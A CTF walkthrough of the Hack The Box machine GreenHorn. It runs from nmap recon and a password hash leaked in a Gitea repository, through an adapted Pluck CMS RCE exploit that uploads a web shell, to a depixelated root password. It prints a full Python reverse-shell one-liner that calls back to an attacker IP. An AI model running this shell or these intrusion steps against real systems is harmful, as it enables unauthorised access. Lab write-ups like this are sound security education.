---
title: CTF Walkthrough for HTB Machine GreenHorn
date: 2024-10-02 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [HTB, Writeup, Depixelisation]   
image:
  path: /assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/box-greenhorn.webp
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about GreenHorn a machine on the Hack The Box platform. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment. 
### Machine Description
Name: GreenHorn<br>
Difficulty: Easy<br>
Operating System: Linux<br>
Machine link: [GreenHorn HTB](https://app.hackthebox.com/machines/GreenHorn)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) Depix<br>
4) Hashcat<br>

## Reconnaisance
We will start by enumerating open ports on our target using Nmap SYN packet scan
```bash 
sudo nmap -sS -n 10.10.11.25 -oN ports-dis.nmap 
```
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/ports-dis.png)

We now enumerate the service's names and versions using Nmap's common scripts service discovery scan.
```bash
sudo nmap -sV -sC  -n 10.10.11.25 -p 22,80,3000 -oN services-dis.nmap
```
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/services-scan.png)

From the service scan above, we can identify the target's domain. we can add to our /etc/hosts file
```bash
echo '10.10.11.25   greenhorn.htb' | sudo tee -a  /etc/hosts 
```
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/hosts-config.png)

From our scan result, we can identify two web applications that run on the target. Let's visit the first one running on port 80. Here we can see a greeting page welcoming new web developers. 
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/first-browse.png)

From the greeting page, we can see a link that brings us to a login form. On that login form, we can see the version number of something called Pluck. A quick Google search shows us that Pluck is a CMS. 
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/cms-version.png)
 
## Exploitation

Since the CMS version is displayed on the page we can use searchsploit to see if that specific version number has any public exploit available. We can see an RCE vulnerability is available for that specific version number.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/exploit-finding.png)

When we examine the exploit script we can see that the RCE is possible only after login but at this point in our assessment we do have a password. Let's skip this for the moment.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/exploit-examine.png)

We have reached a limit in the web application running on port 80 because we don't have credentials. Let's visit the second web application uncovered during the service scan running on port 3000. We can see that our target runs a Gitlab instance. 
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/second-browse.png)

Gitlab instances are known to contain source code that may expose credentials. When we navigate to public repositories, we can see a repository named like of the web application running on port 80. This might surely be its source code.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/public-repos.png)

Since we are hunting for credentials, Let's examine how the login.php responsible functions. Credentials are usually identified by searching for something containing the keyword 'pass'. Looking for this keyword in the search bar, we can see online a certain file named pass.php is imported from the data/settings/ directory.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/code-examine.png)

Upon visiting this file we discover that a variable named $ww containing a long string is indeed imported into the login.php file.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/password-dis.png)

To understand the use of this variable we can go to the login.php file and search for its name. We will see that this variable is used on 79 that it's being compared with another variable named $pass. The line just above i.e. line 78 shows the password comparison taking place.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/password-dis-2.png)

At this point, we have identified the variable containing the password entered by the user but we don't know if this password is processed as cleartext after being hashed or encrypted. For this reason, we can search for all the occurrences of the variable $pass. Reading through the login.php file more deeply we can see on line 56  that the password stored in the POST parameter count1 is first hash using sha-512 before being stored in the $pass variable. With this finding, we can conclude that the value stored in $ww above is also the sha-512 hash of the admin's password. 
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/password-dis-3.png)

We can copy this password and brute force it using Hashcat mode 1700.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/hashcat.png)

Now that we have a password, Let's go back to the web application running the vulnerable CMS and modify the exploit for our target.
We will modify line 19 by replacing the value of the count1 dictionary key with that of the cracked password. Also, we will replace localhost with the actual domain of our target. Notice that when we access the login.php page from our browser we access it directly from the web root directory. For this reason, we need to remove the 'pluck' directory from every link in the payload. It should look like the image below.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/exploit-modification.png)

Line 21 tells us that the exploit requires a zip file. This is surely the PHP code to be executed on the target after successful exploitation. So let's create a simple PHP webshell and compress it into an archive.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/payload-craft.png)

If we read through the payload again we will notice that the payload uploads our webshell zip file with a default name i.e. mirabbas.zip. Note this target is being accessed by many other hackers so we may want to change this default name to our custom name to avoid overwriting someone's file who used this name. To do this we should change all the occurrences of mirabbas with nicefile.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/exploit-modification-1.png)

Since the payload I used here is a basic web shell we will have to make a few modifications at the end of the script.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/exploit-modification-2.png)

Now that our script is ready, we can run it to upload our web shell and use that web shell to execute commands on the target.<br>
*Some people may decide to upload a PHP reverse shell and catch a shell directly after running the exploit POC*
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/exploit-exec.png)

Great, we have obtained a foothold on our target. We can leverage this simple web shell to obtain a tty reverse shell by using the Python3 payload below. Don't forget to start your listener at the specified port before executing it on the target.
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.50",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("sh")'
```

Never forget that users are usually prone to use the same password across many services. So, let's try to authenticate as the user junior using the same password we cracked above.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/user-auth-1.png)
We can see that we had successfully authenticated as a junior, we can use this access to read the flag and continue our enumeration process.

## Post Exploitation

In our user's home directory we can see an interesting file, let's transfer it to our attack host for further analysis.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/user-file-trans-1.png)

![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/user-file-trans-2.png)

When we open the PDF file, we see something that resembles a command prompt when a user uses the sudo command but at the place of the password, we see a blurry image. I opened the image in a word processing application and I saved it locally to my system. 

I searched for how to recover blur images and I came across the tool [Depix](https://github.com/spipm/Depix). We can download this tool and following the installation guide on the tool's README.md page try to recover the blur image.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/depix-image.png)

The tool outputs a new image called output.png in the same working directory. This image is not completely clear but the characters are distinguishable.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/output.png)

We then use that password to log in as root through SSH. With this access, we can read the root's flag.
![](/assets/img/posts/walthrough/hackthebox/2024-10-02-greenhorn/root-access.png)

## Conclusion

Congratulations! In this walkthrough, you have exploited a vulnerability in Pluck CMS after discovering the password of the admin user in the Public Gitea repository. Finally, you depixelise an image to reveal the root user password. This machine was designed to demonstrate how poor update practices and keeping sensitive files publicly accessible can seriously impact an organisation's security posture. Thanks for following up on this walkthrough.
